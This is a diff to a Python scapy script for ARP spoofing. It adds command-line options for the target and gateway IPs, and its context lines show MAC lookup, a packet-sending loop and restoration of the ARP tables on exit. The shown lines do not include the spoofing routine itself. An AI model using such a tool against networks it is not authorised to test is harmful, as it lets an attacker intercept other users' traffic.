@@ -4,34 +4,36 @@ import scapy.all as scapy
 import time
 import sys
 import getopt
+import os
+
+
+def main(argv):
+   global target_ip
+   global gateway_ip
+   try:
+      opts, args = getopt.getopt(argv,"ht:g:",["target=","gateway="])
+   except getopt.GetoptError:
+      print ('Error, urecognized option')
+      sys.exit(2)
+   for opt, arg in opts:
+      if opt == '-h':
+         print (os.path.basename(__file__)+ ' -t <Target IP> -g <Gateway IP>')
+         sys.exit()
+      elif opt in ("-t", "--target"):
+         target_ip = arg
+      elif opt in ("-g", "--gateway"):
+         gateway_ip = arg
+   print ('Target IP: ' + target_ip)
+   print ('Gateway IP: ' + gateway_ip)
+ 
+if __name__ == "__main__":
+   main(sys.argv[1:])
 
 
 
-#def main(argv):
-#   target_ip = ''
-#   gateway_ip = ''
-#   try:
-#      opts, args = getopt.getopt(argv,"hi:o:",["target_ip=","gateway_ip="])
-#   except getopt.GetoptError:
-#      print ('test.py -t <target IP> -g <Gateway IP>')
-#      sys.exit(2)
-#   for opt, arg in opts:
-#      if opt == '-h':
-#         print ('test.py -t <target IP> -g <Gateway IP>')
-#         sys.exit()
-#      elif opt in ("-t", "--trage_tip"):
-#         target_ip = arg
-#      elif opt in ("-g", "--gateway_ip"):
-#         gateway_ip = arg
-#   print ('Target IP: ', target_ip)
-#   print ('GatewayIP: ', gateway_ip)
 
-
-#if __name__ == "__main__":
-#   main(sys.argv[1:])
-
-target_ip = ''
-gateway_ip = ''
+#target_ip = '192.168.1.107'
+#gateway_ip = '192.168.1.1'
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -69,7 +71,7 @@ try:
         sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
-    print("\n Resetting Arp tables...\n")
+    print("\nResetting Arp tables...\n")
     restore(target_ip, gateway_ip)
     restore(gateway_ip,target_ip)
     print("Quitting...")
